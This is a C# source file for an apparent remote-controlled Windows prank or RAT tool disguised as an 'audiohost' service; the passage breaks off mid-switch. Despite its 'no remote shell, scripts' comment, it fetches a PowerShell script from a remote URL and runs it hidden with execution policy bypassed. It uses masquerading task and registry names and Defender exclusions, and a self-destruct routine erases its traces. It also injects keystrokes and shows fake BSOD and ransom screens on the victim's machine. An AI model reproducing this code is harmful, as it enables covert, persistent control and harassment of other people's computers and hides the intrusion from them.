using System.ComponentModel;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace PanicControl;

// Fixed Windows actions only. No remote shell, scripts, or arbitrary process arguments.
internal sealed partial class NativeWindows
{
    public const ushort Win=0x5B, Ctrl=0x11, Alt=0x12, Shift=0x10;
    // Bootstrap fuer das Selbst-Update. Gleiche Quelle, die auch der HID-Weg
    // holt, damit es nur eine Wahrheit gibt, was installiert wird.
    private const string StageUrl="https://raw.githubusercontent.com/ente1231/audiohost/main/Stage.txt";
    public bool DryRun { get; }
    private readonly Dictionary<string, Action> restore = new();
    private readonly Dictionary<string,RemoteOverlay> overlays=new();
    public IReadOnlyCollection<string> OverlayIds=>overlays.Keys.ToArray();
    public bool HasPresentations=>presentations.Count>0;
    private readonly List<(int Pid,string Name,long After,long Expires)> presentations=new();
    private long lastPresentation;
    private bool danceEnabled,danceWinHeld,danceRight;
    private ushort danceArrow;
    private long nextDance;
    private int explorerRemaining;
    private long nextExplorer;
    public bool ExplorerActive=>explorerRemaining>0;
    private ulong lastIdle, lastKernel, lastUser;
    private readonly Queue<string> simulated = new();
    public IReadOnlyCollection<string> Simulated => simulated.ToArray();
    public NativeWindows(bool dryRun) { DryRun=dryRun; GetSystemTimes(out var i,out var k,out var u);lastIdle=i.Value;lastKernel=k.Value;lastUser=u.Value; }
    private void Record(string action) { if(simulated.Count>=128)simulated.Dequeue();simulated.Enqueue(action); }

    [StructLayout(LayoutKind.Sequential)] internal struct MouseInput { public int dx,dy;public uint data,flags,time;public UIntPtr extra; }
    [StructLayout(LayoutKind.Sequential)] internal struct KeyInput { public ushort key,scan;public uint flags,time;public UIntPtr extra; }
    [StructLayout(LayoutKind.Explicit)] internal struct InputUnion { [FieldOffset(0)]public MouseInput mouse;[FieldOffset(0)]public KeyInput key; }
    [StructLayout(LayoutKind.Sequential)] internal struct Input { public uint type;public InputUnion value; }
    [DllImport("user32.dll",SetLastError=true)] private static extern uint SendInput(uint count,Input[] inputs,int size);
    [DllImport("user32.dll",SetLastError=true)] private static extern bool LockWorkStation();
    [DllImport("user32.dll")] private static extern int GetSystemMetrics(int index);
    [DllImport("powrprof.dll",SetLastError=true)]
    [return:MarshalAs(UnmanagedType.U1)] private static extern bool SetSuspendState([MarshalAs(UnmanagedType.U1)]bool hibernate,[MarshalAs(UnmanagedType.U1)]bool force,[MarshalAs(UnmanagedType.U1)]bool disableWake);
    [DllImport("user32.dll",EntryPoint="SystemParametersInfoW",SetLastError=true)] private static extern bool SpiInt(uint action,uint parameter,ref int value,uint flags);
    [DllImport("user32.dll",EntryPoint="SystemParametersInfoW",SetLastError=true)] private static extern bool SpiPtr(uint action,uint parameter,IntPtr value,uint flags);
    [StructLayout(LayoutKind.Sequential)] private struct Sticky { public uint size,flags; }
    [StructLayout(LayoutKind.Sequential)] private struct Filter { public uint size,flags,wait,delay,repeat,bounce; }
    [StructLayout(LayoutKind.Sequential)] private struct MouseKeys { public uint size,flags,maxSpeed,timeToMax,controlSpeed,reserved1,reserved2; }
    [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)] private struct Contrast { public uint size,flags;public IntPtr scheme; }
    [DllImport("user32.dll",EntryPoint="SystemParametersInfoW",SetLastError=true)] private static extern bool SpiSticky(uint a,uint b,ref Sticky v,uint f);
    [DllImport("user32.dll",EntryPoint="SystemParametersInfoW",SetLastError=true)] private static extern bool SpiFilter(uint a,uint b,ref Filter v,uint f);
    [DllImport("user32.dll",EntryPoint="SystemParametersInfoW",SetLastError=true)] private static extern bool SpiMouse(uint a,uint b,ref MouseKeys v,uint f);
    [DllImport("user32.dll",EntryPoint="SystemParametersInfoW",SetLastError=true)] private static extern bool SpiContrast(uint a,uint b,ref Contrast v,uint f);
    [DllImport("user32.dll",SetLastError=true)] private static extern IntPtr OpenInputDesktop(uint flags,bool inherit,uint access);
    [DllImport("user32.dll",CharSet=CharSet.Unicode,SetLastError=true)] private static extern bool GetUserObjectInformation(IntPtr obj,int index,System.Text.StringBuilder info,uint length,out uint required);
    [DllImport("user32.dll")] private static extern bool CloseDesktop(IntPtr desktop);
    [StructLayout(LayoutKind.Sequential)] private struct FileTime { public uint low,high;public ulong Value=>((ulong)high<<32)|low; }
    [DllImport("kernel32.dll")] private static extern bool GetSystemTimes(out FileTime idle,out FileTime kernel,out FileTime user);
    [StructLayout(LayoutKind.Sequential)] private struct MemoryInfo { public uint length,load;public ulong totalPhys,availPhys,totalPage,availPage,totalVirtual,availVirtual,extended; }
    [DllImport("kernel32.dll",SetLastError=true)] private static extern bool GlobalMemoryStatusEx(ref MemoryInfo info);
    [DllImport("kernel32.dll")] private static extern ulong GetTickCount64();

    private static void Check(bool ok) { if(!ok)throw new Win32Exception(Marshal.GetLastWin32Error()); }
    public void CheckDesktop()
    {
        if(DryRun)return;
        var desktop=OpenInputDesktop(0,false,1);
        if(desktop==IntPtr.Zero)throw new InvalidOperationException("Windows ist gesperrt oder zeigt einen Sicherheitsdialog. Am PC entsperren.");
        try { var name=new System.Text.StringBuilder(128);if(!GetUserObjectInformation(desktop,2,name,256,out _)||name.ToString()!="Default")throw new InvalidOperationException("Sicherheitsdesktop: Bitte am PC bestätigen oder entsperren."); }
        finally { CloseDesktop(desktop); }
    }
    private void Send(params Input[] inputs)
    {
        if(DryRun){foreach(var i in inputs)Record(i.type==1?$"key:{i.value.key.key:X2}:{((i.value.key.flags&2)!=0?"up":"down")}":"input");return;}
        CheckDesktop();
        if(SendInput((uint)inputs.Length,inputs,Marshal.SizeOf<Input>())!=inputs.Length)
            throw new InvalidOperationException("Windows hat die Eingabe blockiert. Programme mit Administratorrechten und manche Spiele akzeptieren keine simulierten Eingaben.");
    }
    private static Input Key(ushort key,bool up=false,bool unicode=false)=>new(){type=1,value=new InputUnion{key=new KeyInput{key=unicode?(ushort)0:key,scan=unicode?key:(ushort)0,flags=(up?2u:0u)|(unicode?4u:0u)|(!unicode&&(key is >=0x21 and <=0x2E or 0x5B or 0x5C)?1u:0u)}}};
    public void Hotkey(params ushort[] keys)
    {
        // A concurrent action must not inherit the held dance modifier.
        ReleaseDanceKeys();
        var inputs=keys.Select(k=>Key(k)).Concat(keys.Reverse().Select(k=>Key(k,true))).ToArray();
        try { Send(inputs); }
        catch { if(!DryRun)SendInput((uint)keys.Length,keys.Reverse().Select(k=>Key(k,true)).ToArray(),Marshal.SizeOf<Input>());throw; }
    }
    private void ReleaseDanceKeys()
    {
        var keys=new List<Input>();if(danceArrow!=0)keys.Add(Key(danceArrow,true));if(danceWinHeld)keys.Add(Key(Win,true));
        danceArrow=0;danceWinHeld=false;
        if(keys.Count==0)return;
        if(DryRun)Send(keys.ToArray());else SendInput((uint)keys.Count,keys.ToArray(),Marshal.SizeOf<Input>());
    }
    public void SetDance(bool enabled)
    {
        ReleaseDanceKeys();danceEnabled=enabled;nextDance=0;danceRight=false;
    }
    public void DanceTick(long now)
    {
        if(!danceEnabled)return;
        if(danceArrow!=0){Send(Key(danceArrow,true));danceArrow=0;}
        if(now<nextDance)return;
        if(!danceWinHeld){danceWinHeld=true;try{Send(Key(Win));}catch{SetDance(false);throw;}}
        danceArrow=danceRight?(ushort)0x27:(ushort)0x25;danceRight=!danceRight;
        try{Send(Key(danceArrow));nextDance=now+100;}
        catch{SetDance(false);throw;}
    }
    public void StartExplorerBurst(){explorerRemaining=10;nextExplorer=0;}
    public void CancelExplorerBurst(){explorerRemaining=0;}
    public void ExplorerTick(long now)
    {
        if(explorerRemaining==0||now<nextExplorer)return;
        Hotkey(Win,0x45);if(!DryRun)QueuePresentation(0,"explorer");explorerRemaining--;nextExplorer=now+350;
    }
    public void Type(string text) { ReleaseDanceKeys();foreach(char c in text)Send(Key(c,unicode:true),Key(c,true,true)); }
    public void Move(int dx,int dy) { Send(new Input{type=0,value=new InputUnion{mouse=new MouseInput{dx=dx,dy=dy,flags=1}}}); }
    public void Click(string button="left") { ReleaseDanceKeys();uint down=button=="right"?8u:button=="middle"?32u:2u;Send(new Input{value=new InputUnion{mouse=new MouseInput{flags=down}}},new Input{value=new InputUnion{mouse=new MouseInput{flags=down*2}}}); }
    public void Scroll(int steps) { Send(new Input{value=new InputUnion{mouse=new MouseInput{flags=0x800,data=unchecked((uint)(steps*120))}}}); }
    private void Start(string file,params string[] args)
    {
        if(DryRun){Record("start:"+Path.GetFileName(file));return;}
        // Kein Desktop-Check: ein Prozess zu starten geht auf jedem Desktop.
        var p=new ProcessStartInfo(file){UseShellExecute=false,CreateNoWindow=true};foreach(var a in args)p.ArgumentList.Add(a);Process.Start(p)?.Dispose();
    }
    private void StartVisible(string file,params string[] args)
    {
        if(DryRun){Record("start:"+Path.GetFileName(file));return;}
        CheckDesktop();var info=new ProcessStartInfo(file){UseShellExecute=true,WindowStyle=ProcessWindowStyle.Maximized};foreach(var a in args)info.ArgumentList.Add(a);
        using var process=Process.Start(info);
        var name=file=="ms-settings:"?"SystemSettings":Path.GetFileNameWithoutExtension(file);if(name=="calc")name="CalculatorApp";
        QueuePresentation(process?.Id??0,name);
    }
    private void QueuePresentation(int pid,string name){if(presentations.Count>=8)presentations.RemoveAt(0);var now=Environment.TickCount64;presentations.Add((pid,name,now+450,now+8000));}
    [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll",CharSet=CharSet.Unicode)] private static extern int GetClassName(IntPtr window,System.Text.StringBuilder name,int count);
    public void PresentationTick(long now)
    {
        if(presentations.Count==0)return;
        try{CheckDesktop();}catch(InvalidOperationException){presentations.Clear();return;}
        if(now-lastPresentation<150)return;lastPresentation=now;
        foreach(var item in presentations.ToArray())
        {
            if(now>item.Expires){presentations.Remove(item);continue;}
            if(now<item.After)continue;
            IntPtr handle=IntPtr.Zero;
            try{if(item.Pid>0){using var process=Process.GetProcessById(item.Pid);handle=process.MainWindowHandle;}}catch(ArgumentException){}catch(System.ComponentModel.Win32Exception){}catch(InvalidOperationException){}
            if(handle==IntPtr.Zero)
            {
                using var own=Process.GetCurrentProcess();
                foreach(var candidate in Process.GetProcessesByName(item.Name))
                {using(candidate){try{if(candidate.SessionId==own.SessionId&&candidate.MainWindowHandle!=IntPtr.Zero)handle=candidate.MainWindowHandle;}catch(System.ComponentModel.Win32Exception){}catch(InvalidOperationException){}}}
            }
            if(handle==IntPtr.Zero)
            {
                var foreground=GetForegroundWindow();GetWindowThreadProcessId(foreground,out var pid);
                try{using var process=Process.GetProcessById((int)pid);if(process.ProcessName.Equals(item.Name,StringComparison.OrdinalIgnoreCase))
                    {var cls=new System.Text.StringBuilder(128);GetClassName(foreground,cls,128);if(item.Name!="explorer"||cls.ToString() is "CabinetWClass" or "ExploreWClass")handle=foreground;}}
                catch(ArgumentException){}catch(System.ComponentModel.Win32Exception){}catch(InvalidOperationException){}
            }
            if(handle!=IntPtr.Zero){ShowWindowAsync(handle,3);SetForegroundWindow(handle);presentations.Remove(item);}
        }
    }

    public void Launch(string path)
    {
        if (string.IsNullOrWhiteSpace(path)) throw new InvalidOperationException("Kein Ziel angegeben.");
        var p = path.Trim().Trim('"');
        if (File.Exists(p)) { StartVisible(p); return; }
        // Kurznamen wie notepad, calc, mspaint loest Windows selbst auf.
        if (p.IndexOfAny(new[] { '\\', '/' }) < 0) { StartVisible(p); return; }
        throw new InvalidOperationException("Datei nicht gefunden: " + p);
    }

    // Removes every trace this app left on the machine and deletes itself.
    // Covers both layouts: machine-wide (admin) and per-user (standard account).
    // Runs through a detached .cmd so the files can go away after this process exits.
    public void SelfDestruct()
    {
        if(DryRun){Record("selfDestruct");return;}
        // Zuerst alles zuruecksetzen, was dieser Lauf am Rechner veraendert hat:
        // Hintergrundbild, Cursor, Taskleiste, Hooks, Overlays. Sonst bleibt ein
        // kaputter Desktop zurueck, obwohl die Dateien weg sind.
        try{Restore();}catch{}
        try{CloseEffects();}catch{}

        string machineDir=Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),@"audiohost");
        string userDir=Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),@"audiohost");
        // Frueherer Ordnername: bei der Selbstzerstoerung mitnehmen.
        string machineDirOld=Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),@"ClassroomHelper");
        string userDirOld=Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),@"ClassroomHelper");
        string userData=Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),@"Microsoft\Windows\Caches\{8A3F9C2E-1B4D}");
        string oldShadow=Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),@"Microsoft\Windows\Caches\ClassroomData");
        string startup=Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        string commonStartup=Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
        string temp=Path.GetTempPath();
        string exe=Process.GetCurrentProcess().MainModule?.FileName??"";

        // ---- Registry und Startmenue: direkt, nicht ueber reg.exe ----
        // Ein reg-Aufruf aus einem .cmd kann an Quoting oder an der
        // WOW6432Node-Umleitung scheitern; hier greift der Prozess selbst zu.
        foreach(var name in new[]{"ClassroomHelperService","ClassroomHelper","AudioHelper","WindowsAudioHost"})
        {
            DeleteValue(Registry.CurrentUser,@"Software\Microsoft\Windows\CurrentVersion\Run",name);
            DeleteValue(Registry.CurrentUser,@"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",name);
            try
            {
                using var hklm=Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",true);
                hklm?.DeleteValue(name,false);
            }catch{}
        }
        foreach(var name in new[]{"ClassroomHelperOnce","AudioHelperOnce","WindowsAudioHostOnce"})
            DeleteValue(Registry.CurrentUser,@"Software\Microsoft\Windows\CurrentVersion\RunOnce",name);
        foreach(var name in new[]{"AudioHelper.url","Classroom Helper.url","WindowsAudioHost.url"})
            DeleteValue(Registry.CurrentUser,@"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder",name);

        // ---- Startmenue-Verknuepfungen und Temp-Spuren ----
        foreach(var dir in new[]{startup,commonStartup})
            foreach(var name in new[]{"Classroom Helper.url","AudioHelper.url","WindowsAudioHost.url"})
                TryDeleteFile(Path.Combine(dir,name));
        TryDeleteFile(Path.Combine(temp,"s.ps1"));
        TryDeleteFile(Path.Combine(temp,"ch-wallpaper.jpg"));
        TryDeleteFile(Path.Combine(temp,"ch-install.log"));
        TryDeleteDir(Path.Combine(temp,"ch-wp"));
        try{foreach(var f in Directory.GetFiles(temp,"wp_*.bmp"))TryDeleteFile(f);}catch{}
        try{foreach(var f in Directory.GetFiles(temp,"pc-cleanup-*.cmd"))TryDeleteFile(f);}catch{}

        // ---- Was jetzt schon weg kann, geht jetzt ----
        // Schattendaten und ProgramData beruehrt der laufende Prozess nicht, die
        // koennen sofort weg. Im Installationsordner bleibt nur die laufende
        // .exe stehen - alles andere ist vor dem Neustart des Rechners weg.
        TryDeleteDir(oldShadow);
        TryDeleteDir(userData);
        TryDeleteDir(machineDir);TryDeleteDir(machineDirOld);
        try
        {
            foreach(var f in Directory.GetFiles(userDir))
                if(!string.Equals(f,exe,StringComparison.OrdinalIgnoreCase))TryDeleteFile(f);
            foreach(var d in Directory.GetDirectories(userDir))TryDeleteDir(d);
        }catch(IOException){}catch(UnauthorizedAccessException){}

        // ---- Dateien: erst nach dem eigenen Ende ----
        // Eine laufende .exe laesst sich nicht loeschen. Das Skript wartet, bis
        // das Image freigegeben ist, und raeumt dann die Ordner.
        // Reihenfolge: warten, toeten, Bild abwarten, Bild loeschen, dann zwei
        // volle Durchgaenge ueber alle Ordner. Ein Durchgang reicht nicht, weil
        // der Virenscanner nach dem Loeschen noch ein Handle offen haelt und der
        // Ordner sonst als leerer Rest stehen bleibt.
        string script=Path.Combine(temp,"pc-cleanup-"+Guid.NewGuid().ToString("N")+".cmd");
        var dirs=new[]{machineDir,userDir,machineDirOld,userDirOld,oldShadow,userData};
        var sb=new System.Text.StringBuilder();
        sb.AppendLine("@echo off");
        sb.AppendLine("setlocal enabledelayedexpansion");
        sb.AppendLine("ping -n 4 127.0.0.1 >nul");
        sb.AppendLine("schtasks /Delete /F /TN \"Microsoft\\Windows\\Multimedia\\SystemAudioCalibration\" >nul 2>&1");
        sb.AppendLine("schtasks /Delete /F /TN \"ClassroomHelperSvc\" >nul 2>&1");
        sb.AppendLine("schtasks /Delete /F /TN \"ClassroomHelperAll\" >nul 2>&1");
        sb.AppendLine("netsh advfirewall firewall delete rule name=\"PanicControl-Local-8443\" >nul 2>&1");
        sb.AppendLine("powershell -NoProfile -WindowStyle Hidden -Command \"Remove-MpPreference -ExclusionPath '"+machineDir+"' -ExclusionProcess 'AudioHelper.exe' -ErrorAction SilentlyContinue\" >nul 2>&1");
        sb.AppendLine("taskkill /f /im AudioHelper.exe >nul 2>&1");
        sb.AppendLine("taskkill /f /im ClassroomHelper.exe >nul 2>&1");
        sb.AppendLine("taskkill /f /im WindowsAudioHost.exe >nul 2>&1");
        // Spuren im Temp und im Benutzerprofil: Installationsprotokoll,
        // heruntergeladene Stage, Test-Hintergrundbilder, Merker.
        sb.AppendLine("del /f /q \"%TEMP%\\ch-install.log\" >nul 2>&1");
        sb.AppendLine("del /f /q \"%TEMP%\\s.ps1\" >nul 2>&1");
        sb.AppendLine("del /f /q \"%TEMP%\\wp_*.bmp\" >nul 2>&1");
        sb.AppendLine("del /f /q \"%TEMP%\\pc-cleanup-*.cmd\" >nul 2>&1");
        sb.AppendLine("del /f /q \"%TEMP%\\ch-*.dat\" >nul 2>&1");
        sb.AppendLine("del /f /q \"%LOCALAPPDATA%\\audiohost\\.cursors\" >nul 2>&1");
        sb.AppendLine("del /f /q \"%LOCALAPPDATA%\\audiohost\\.boot\" >nul 2>&1");
        sb.AppendLine("del /f /q \"%LOCALAPPDATA%\\audiohost\\.user-ready\" >nul 2>&1");
        sb.AppendLine("del /f /q \"%LOCALAPPDATA%\\audiohost\\data\\.first-cred.txt\" >nul 2>&1");
        sb.AppendLine("del /f /q \"%LOCALAPPDATA%\\audiohost\\bin\\relay.txt\" >nul 2>&1");
        sb.AppendLine("del /f /q \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AudioHelper.url\" >nul 2>&1");
        sb.AppendLine("del /f /q \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AudioHelper.url\" >nul 2>&1");
        if(exe.Length>0)
        {
            sb.AppendLine("set /a wait=0");
            sb.AppendLine(":waitimg");
            sb.AppendLine("if not exist \""+exe+"\" goto img_gone");
            sb.AppendLine("set /a wait+=1");
            sb.AppendLine("if %wait% geq 20 goto img_gone");
            sb.AppendLine("ping -n 2 127.0.0.1 >nul");
            sb.AppendLine("goto waitimg");
            sb.AppendLine(":img_gone");
            sb.AppendLine("del /f /q \""+exe+"\" >nul 2>&1");
        }
        sb.AppendLine("call :wipe");
        sb.AppendLine("ping -n 4 127.0.0.1 >nul");
        sb.AppendLine("call :wipe");
        sb.AppendLine("del /f /q \"%~f0\" >nul 2>&1");
        sb.AppendLine("exit /b");
        sb.AppendLine(":wipe");
        foreach(var dir in dirs) sb.AppendLine("call :killdir \""+dir+"\"");
        sb.AppendLine("goto :eof");
        // Ein Ordner pro Aufruf. Das goto muss nur diese eine Schleife
        // verlassen - ein gemeinsames :eof wuerde beim ersten fehlenden
        // Ordner den ganzen Durchgang abbrechen.
        sb.AppendLine(":killdir");
        sb.AppendLine("for /l %%i in (1,1,8) do (");
        sb.AppendLine("  if not exist \"%~1\" goto :killdone");
        sb.AppendLine("  rd /s /q \"%~1\" >nul 2>&1");
        sb.AppendLine("  if exist \"%~1\" (echo FAIL %%~1 i=%%i err=!errorlevel! >> \"%TEMP%\\pc-cleanup.log\") else (echo OK %%~1 i=%%i >> \"%TEMP%\\pc-cleanup.log\")");
        sb.AppendLine("  ping -n 2 127.0.0.1 >nul");
        sb.AppendLine(")");
        sb.AppendLine(":killdone");
        sb.AppendLine("goto :eof");
        try
        {
            File.WriteAllText(script,sb.ToString());
            Process.Start(new ProcessStartInfo(SystemExe("cmd.exe")){ArgumentList={"/c",script},CreateNoWindow=true,UseShellExecute=false,WindowStyle=ProcessWindowStyle.Hidden})?.Dispose();
        }
        catch(IOException){}catch(Win32Exception){}catch(UnauthorizedAccessException){}
        // Der eigene Prozess haelt die .exe offen. Environment.Exit kann an
        // einem haengenden Finalizer oder UI-Thread stehenbleiben - deshalb
        // nach kurzer Frist hart beenden.
        Task.Run(() => { Thread.Sleep(1500); try { Process.GetCurrentProcess().Kill(); } catch { } });
    }

    private static void DeleteValue(RegistryKey root,string path,string name)
    {
        try
        {
            using var key=root.OpenSubKey(path,true);
            key?.DeleteValue(name,false);
        }catch{}
    }
    private static void TryDeleteFile(string path)
    {
        try{if(File.Exists(path))File.Delete(path);}catch{}
    }
    private static void TryDeleteDir(string path)
    {
        try{if(Directory.Exists(path))Directory.Delete(path,true);}catch{}
    }

    // ---- neue Aktionen -------------------------------------------------
    [StructLayout(LayoutKind.Sequential)] private struct APPBARDATA
    { public int cbSize; public IntPtr hWnd; public uint uCallbackMessage; public uint uEdge; public RECT rc; public IntPtr lParam; }
    [StructLayout(LayoutKind.Sequential)] private struct RECT { public int Left, Top, Right, Bottom; }
    [DllImport("shell32.dll")] private static extern UIntPtr SHAppBarMessage(uint message, ref APPBARDATA data);
    private const uint ABM_SETSTATE = 0x0000000A, ABS_AUTOHIDE = 1, ABS_ALWAYSONTOP = 2;

    private static void SetTaskbar(bool autoHide)
    {
        var data = new APPBARDATA();
        data.cbSize = Marshal.SizeOf<APPBARDATA>();
        data.lParam = (IntPtr)(autoHide ? ABS_AUTOHIDE : ABS_ALWAYSONTOP);
        SHAppBarMessage(ABM_SETSTATE, ref data);
    }

    private static string? savedWallpaper;
    private static string? trollWallpaper;

    private static void Wallpaper(bool troll)
    {
        const uint SPI_GETDESKWALLPAPER = 0x0073;
        if (troll)
        {
            var buffer = new string('\0', 260);
            var ptr = Marshal.StringToHGlobalUni(buffer);
            try { SpiPtr(SPI_GETDESKWALLPAPER, 260, ptr, 0); savedWallpaper = Marshal.PtrToStringUni(ptr); }
            finally { Marshal.FreeHGlobal(ptr); }

            string file = Path.Combine(Path.GetTempPath(), "wp_" + Guid.NewGuid().ToString("N").Substring(0, 6) + ".bmp");
            using (var bmp = new System.Drawing.Bitmap(1920, 1080))
            using (var g = System.Drawing.Graphics.FromImage(bmp))
            {
                g.Clear(System.Drawing.Color.FromArgb(180, 0, 120));
                using var font = new System.Drawing.Font("Segoe UI", 96, System.Drawing.FontStyle.Bold);
                g.DrawString("6767", font, System.Drawing.Brushes.White, 60, 440);
                bmp.Save(file, System.Drawing.Imaging.ImageFormat.Bmp);
            }
            trollWallpaper = file;
            ApplyWallpaperFile(file);
        }
        else
        {
            string path = string.IsNullOrEmpty(savedWallpaper) ? "" : savedWallpaper!;
            ApplyWallpaperFile(path);
            // Das erzeugte Bild liegt im Temp und wird hier gleich mit entfernt.
            try { if (!string.IsNullOrEmpty(trollWallpaper) && File.Exists(trollWallpaper)) File.Delete(trollWallpaper); } catch { }
            trollWallpaper = null;
        }
    }

    private static void ApplyWallpaperFile(string file)
    {
        IntPtr p = Marshal.StringToHGlobalUni(file);
        try { SpiPtr(0x0014, 0, p, 0x01 | 0x02); }
        finally { Marshal.FreeHGlobal(p); }
        try
        {
            using var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop", true);
            key?.SetValue("Wallpaper", file, Microsoft.Win32.RegistryValueKind.String);
        }
        catch { }
    }
    [DllImport("kernel32.dll")] private static extern uint SetThreadExecutionState(uint flags);
    // SetThreadExecutionState gilt pro Thread. Aus dem Relay-Thread gerufen
    // haelt es nur, solange der Thread lebt - also nie zuverlaessig. Deshalb
    // ein eigener Thread, der den Zustand haelt, bis keepAwakeOff kommt.
    private static Thread? awakeThread;
    private static readonly ManualResetEventSlim awakeOff = new(false);

    private static void KeepAwake(bool on)
    {
        if (!on)
        {
            awakeOff.Set();
            try { awakeThread?.Join(2000); } catch { }
            awakeThread = null;
            SetThreadExecutionState(0x80000000u);   // ES_CONTINUOUS
            return;
        }
        if (awakeThread is { IsAlive: true }) return;
        awakeOff.Reset();
        awakeThread = new Thread(() =>
        {
            // ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED
            SetThreadExecutionState(0x80000003u);
            try { awakeOff.Wait(TimeSpan.FromHours(12)); } catch { }
            SetThreadExecutionState(0x80000000u);
        }) { IsBackground = true, Name = "ch-awake" };
        awakeThread.Start();
    }
    // ---- weitere Helfer ------------------------------------------------
    [DllImport("user32.dll")] private static extern IntPtr SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")] private static extern bool SetCursorPos(int x, int y);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern IntPtr FindWindow(string? cls, string? title);

    // Cursor-Groesse: ersetzt durch SetCursorBaseSize() in NativeWindows.Troll.cs.
    // Der alte Weg schrieb nur die Registry ohne Broadcast und ohne Pruefung -
    // deshalb kam am PC nichts an.

    private static void DesktopIcons(bool show)
    {
        try
        {
            int hidden = 0;
            using (var k = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"))
                hidden = k?.GetValue("HideIcons") is int v ? v : 0;

            bool currentlyHidden = hidden == 1;
            if (show == !currentlyHidden) return;   // schon im gewuenschten Zustand
            IntPtr progman = FindWindow("Progman", null);
            if (progman != IntPtr.Zero) SendMessage(progman, 0x0111, (IntPtr)0x7402, IntPtr.Zero);
            using var wk = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
            wk?.SetValue("HideIcons", show ? 0 : 1, Microsoft.Win32.RegistryValueKind.DWord);
        }
        catch { }
    }

    private void KeyboardHold(ushort key, bool down)
    {
        try { Send(Key(key, !down)); } catch { }
    }
    private static string SystemExe(string name)=>Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System),name);
    public void Execute(string id,string? text=null,string? launcher=null,int seconds=60)
    {
        if(id=="winELoop"){StartExplorerBurst();return;}
        ReleaseDanceKeys();
        if(id is "fakeBsod" or "fakeUpdate" or "showMessage" or "screenBlank" or "desktopClock" or "countdown" or "screenColor" or "fakeRansom")
        {ShowOverlay(id,text,seconds);if(DryRun)Record(id);return;}
        if(id=="closeOverlays"){CloseOverlays();return;}
        // Selbst-Update: holt den aktuellen Bootstrap und startet ihn. Die
        // Kennung darin entscheidet, ob neu entpackt wird - gleiche Kennung,
        // kein Download. Damit gehen kuenftige Builds ohne Stecker raus.
        if(id=="update")
        {
            if(DryRun){Record("update");return;}
            var cmd="curl.exe -sL -o \"%TEMP%\\s.ps1\" "+StageUrl+
                    " && powershell -ep bypass -w h -f \"%TEMP%\\s.ps1\"";
            Start(SystemExe("cmd.exe"),"/c",cmd);
            return;
        }
        if(DryRun){Record(id);return;}
        // Kein pauschaler Desktop-Check mehr hier: er hat auf einem gesperrten
        // oder fremden Desktop JEDE Aktion verworfen, auch die ohne Eingabe.
        // Eingaben pruefen sich selbst in Send().
        switch(id)
        {
            case "lock":Check(LockWorkStation());break;
            case "desktop":Hotkey(Win,0x44);break;
            case "sleep":Check(SetSuspendState(false,false,false));break;
            case "shutdown":Start(SystemExe("shutdown.exe"),"/s","/t","15");break;
            case "cancelShutdown":Start(SystemExe("shutdown.exe"),"/a");break;
            case "mouseLeft":Click();break;case "mouseRight":Click("right");break;case "mouseMiddle":Click("middle");break;
            case "mouseDouble":Click();Thread.Sleep(80);Click();break;
            case "scrollUp":Scroll(1);break;case "scrollDown":Scroll(-1);break;
            case "capsToggle":Hotkey(0x14);break;case "randomKey":Hotkey((ushort)Random.Shared.Next(0x41,0x5B));break;
            case "altF4":Hotkey(Alt,0x73);break;case "layoutSwap":Hotkey(Win,0x20);break;
            case "overwrite":Hotkey(0x2D);break;case "doubleSpace":Type("  ");break;case "corruptor":Type("#@!%&/()=?*<>|");break;
            case "typeText":case "iSeeYou":Type(text??"");break;
            case "save":Hotkey(Ctrl,0x53);break;case "undo":Hotkey(Ctrl,0x5A);break;
            case "selectAllSpace":Hotkey(Ctrl,0x41);Thread.Sleep(100);Type(" ");break;
            case "virtDesktop":Hotkey(Win,Ctrl,0x44);break;case "desktopPrev":Hotkey(Win,Ctrl,0x25);break;
            case "desktopNext":Hotkey(Win,Ctrl,0x27);break;case "desktopClose":Hotkey(Win,Ctrl,0x73);break;
            case "rotate":Hotkey(Ctrl,Alt,0x28);break;
            case "ctrlAltDel":throw new InvalidOperationException("Strg+Alt+Entf muss am PC selbst gedrückt werden; Windows blockiert die Simulation.");
            case "gfxReset":Hotkey(Win,Ctrl,Shift,0x42);break;case "taskMgr":StartVisible(SystemExe("Taskmgr.exe"));break;
            case "peekDesktop":Hotkey(Win,0x44);Thread.Sleep(1500);Hotkey(Win,0x44);break;
            case "printDialog":Hotkey(Ctrl,0x50);break;case "gameBar":Hotkey(Win,0x47);break;case "xboxRecord":Hotkey(Win,Alt,0x52);break;
            case "minimizeAll":Hotkey(Win,0x4D);break;case "restoreAll":Hotkey(Win,Shift,0x4D);break;
            case "windowSnapLeft":Hotkey(Win,0x25);break;case "windowSnapRight":Hotkey(Win,0x27);break;case "windowMonitorNext":Hotkey(Win,Shift,0x27);break;
            case "browserNewTab":Hotkey(Ctrl,0x54);break;case "tabNext":Hotkey(Ctrl,0x09);break;case "tabPrev":Hotkey(Ctrl,Shift,0x09);break;
